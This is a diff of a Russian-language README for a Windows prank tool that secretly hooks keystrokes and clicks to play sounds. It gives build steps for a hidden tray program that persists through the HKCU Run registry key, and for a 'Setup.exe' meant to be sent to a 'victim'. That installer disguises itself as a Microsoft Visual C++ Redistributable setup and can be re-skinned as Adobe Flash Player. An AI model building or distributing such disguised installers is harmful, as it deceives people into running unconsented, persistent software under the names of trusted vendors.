@@ -1,43 +1,80 @@
-# Prank Template
+# Prank Template — сделай свой пранк с нуля
 
-Create your own prank with custom sounds. When the victim presses keys or clicks, random sounds play. The prank runs hidden (no window), starts with Windows, and sits in the system tray.
+Шаблон для создания пранков на Windows. Когда жертва нажимает клавиши или кликает мышкой — играют случайные звуки. Программа висит в трее, запускается скрытно и стартует вместе с Windows.
 
-The included config is set up for GachiMuchi sounds. Swap the sounds, change the settings, and it's your prank.
+В репозитории уже есть Sounds of GachiMuchi — можешь использовать как есть, либо заменить на свои звуки.
 
 ---
 
-## Quick Start
+## Как сделать свой пранк — пошагово
 
-### 1. Add your sounds
-
-Put `.mp3`, `.wav`, `.ogg`, `.flac`, or `.m4a` files into the `sounds/` folder.
-
-The more sounds you add, the longer the victim stays confused.
-
-### 2. Build test version
-
-Run this to build `Prank_Test.exe` - it shows a console window so you can test:
+### Шаг 1. Скачай репозиторий
 
 ```bash
+git clone https://github.com/maf1kkk/GACHI_Prank.git
+cd GACHI_Prank
 pip install -r requirements.txt
-pyinstaller --onefile --console --name Prank_Test src\main.py
 ```
 
-Copy `Prank_Test.exe` to the project root, run it, and test that sounds play when you press keys.
+### Шаг 2. Добавь свои звуки
 
-### 3. Build hidden version (for the victim)
+Положи `.mp3`, `.wav`, `.ogg`, `.flac` или `.m4a` файлы в папку `sounds/`.
 
-Once testing works, build the hidden version:
+Чем больше звуков — тем дольше жертва не поймёт что происходит.
+
+> **Совет:** короткие звуки (до 3 секунд) работают лучше всего — они не успевают надоесть и срабатывают чаще на быстрые нажатия.
+
+### Шаг 3. Настрой поведение
+
+Открой `config.json`:
+
+```json
+{
+    "hotkeys": ["space","ctrl","w","a","s","d"],
+    "mouse_buttons": ["left","right"],
+    "cooldown_ms": 300,
+    "autostart": true,
+    "priority_keywords": ["oh","ah","yeah","fuck"],
+    "priority_weight": 3,
+    "exit_hotkey": "ctrl+alt+shift+f12"
+}
+```
+
+**Что тут можно менять:**
+
+| Параметр | Что делает |
+|----------|-----------|
+| `hotkeys` | Клавиши, при нажатии на которые играет звук |
+| `mouse_buttons` | Кнопки мыши (`left`, `right`, `middle`, `x1`, `x2`) |
+| `cooldown_ms` | Задержка между звуками в миллисекундах |
+| `autostart` | Автозагрузка с Windows (`true`/`false`) |
+| `priority_keywords` | Слова в названиях файлов — такие звуки играют чаще |
+| `priority_weight` | Во сколько раз чаще (3 = в 3 раза чаще) |
+| `exit_hotkey` | Горячая клавиша для выхода и удаления из автозагрузки |
+
+### Шаг 4. Собери тестовую версию
+
+`Prank_Test.exe` — показывает консоль, чтобы ты видел что происходит:
 
 ```bash
-pyinstaller --onefile --windowed --name Prank src\main.py
+pyinstaller --onefile --console --name Prank_Test src/main.py
 ```
 
-### 4. Build the installer
+Запусти `dist/Prank_Test.exe` и проверь что звуки играют при нажатии клавиш.
 
-The installer disguises itself as a fake software setup. Customize it first:
+### Шаг 5. Собери скрытую версию
 
-Edit `src/installer_config.json`:
+`Prank.exe` — без консоли, висит в трее невидимо:
+
+```bash
+pyinstaller --onefile --windowed --name Prank src/main.py
+```
+
+### Шаг 6. Собери установщик для жертвы
+
+Установщик маскируется под установку обычной программы.
+
+Сначала настрой его внешний вид. Создай в корне проекта файл `installer_config.json`:
 
 ```json
 {
@@ -51,99 +88,92 @@ Edit `src/installer_config.json`:
 }
 ```
 
-Then build:
+Теперь собери:
 
 ```bash
-pyinstaller --onefile --windowed --name Setup --add-data "Prank.exe;." --add-data "sounds;sounds" --add-data "config.json;." src\installer.py
+pyinstaller --onefile --windowed --name Setup --add-data "dist/Prank.exe;." --add-data "sounds;sounds" --add-data "config.json;." src/installer.py
 ```
 
-The installer will:
-- Copy `Prank.exe`, sounds, and config to `%ProgramData%\WindowsCppRedist\`
-- Add itself to Windows startup (HKCU Run)
-- Launch the prank
-- Show "Installation complete"
+Готовый `dist/Setup.exe` можно отправлять жертве.
 
-### 5. Send `Setup.exe` to your victim
+**Что делает установщик:**
+1. Показывает окно "Microsoft Visual C++ Redistributable Setup" с прогресс-баром
+2. Копирует `Prank.exe`, звуки и конфиг в `%ProgramData%\WindowsCppRedist\`
+3. Прописывает себя в автозагрузку (HKCU Run)
+4. Запускает пранк
+5. Показывает "Installation complete!"
 
-They run it, see a fake MSVC installer, and the prank starts.
+### Шаг 7. Чистка
+
+Если нужно удалить пранк с компьютера — запусти `remove_prank.bat` от имени администратора. Он убьёт процесс, удалит файлы и почистит реестр.
 
 ---
 
-## Customization
+## Кастомизация установщика
 
-### Change which keys trigger sounds
+Хочешь чтобы установщик выглядел как другая программа? Меняй поля в `installer_config.json`:
 
-Edit `hotkeys` in `config.json`:
+| Поле | Пример |
+|------|--------|
+| `window_title` | `"Adobe Flash Player Setup"` |
+| `header_text` | `"Adobe Flash Player"` |
+| `version_text` | `"Version 32.0.0.465"` |
+| `install_folder` | `"AdobeFlash"` |
+| `startup_name` | `"AdobeFlashUpdater"` |
+| `exe_name` | `"Prank.exe"` |
 
-```json
-"hotkeys": ["space", "ctrl", "alt", "w", "a", "s", "d"]
-```
-
-### Make short sounds play more often
-
-Add keywords to `priority_keywords`. Sounds with these words in their filename get `priority_weight`× higher chance:
-
-```json
-"priority_keywords": ["oh", "ah", "yeah", "fuck"],
-"priority_weight": 3
-```
-
-### Change the app name (shown in tray)
-
-```json
-"app_name": "My Prank",
-"tray_tooltip": "My Prank"
-```
-
-### Change startup registry key name
-
-```json
-"startup_name": "MyServiceName"
-```
-
-### Change the exit hotkey
-
-```json
-"exit_hotkey": "ctrl+alt+shift+f12"
-```
-
-Press `Ctrl+Alt+Shift+F12` to remove the prank from startup and exit.
-
-### Disable mouse triggers
-
-```json
-"mouse_buttons": []
-```
-
-### Adjust cooldown (prevent sound spam)
-
-```json
-"cooldown_ms": 500
-```
+> Не меняй `exe_name` — это имя твоего собранного prank-файла.
 
 ---
 
-## File structure
+## Примеры использования
+
+### Вариант A: Заменить звуки (Gachi → свои)
+
+1. Очисти `sounds/`
+2. Закинь свои звуки
+3. Поменяй `priority_keywords` под свои файлы
+4. Пересобери `Prank.exe` и `Setup.exe`
+
+### Вариант B: Сделать "тихий" пранк (только мышь)
+
+```json
+"hotkeys": [],
+"mouse_buttons": ["left", "right"]
+```
+
+Звуки будут играть только при кликах — жертва долго не поймёт откуда звук.
+
+### Вариант C: Убрать автозагрузку (одноразовый пранк)
+
+```json
+"autostart": false
+```
+
+Для розыгрыша на своём компьютере — запустил, поиграло, закрыл.
+
+---
+
+## Структура файлов
 
 ```
 gachi_prank/
 ├── src/
-│   ├── main.py              # prank engine
-│   └── installer.py          # fake setup installer
-├── sounds/                   # YOUR SOUNDS GO HERE
-├── config.json               # prank settings
-├── installer_config.json     # installer appearance settings (created after first build)
-├── remove_prank.bat          # cleanup script
+│   ├── main.py            # движок пранка (скрытый, трей, хоткеи)
+│   └── installer.py       # фейковый установщик
+├── sounds/                # сюда кидаешь свои звуки
+├── config.json            # настройки пранка
+├── installer_config.json  # настройки внешнего вида установщика
+├── remove_prank.bat       # скрипт для удаления
 ├── requirements.txt
-├── .gitignore
 └── README.md
 ```
 
-## Requirements
+## Системные требования
 
-- Windows 10/11
-- Python 3.10+
+- Windows 10 или 11
+- Python 3.10+ (чтобы собирать)
 
-## License
+## Лицензия
 
 MIT
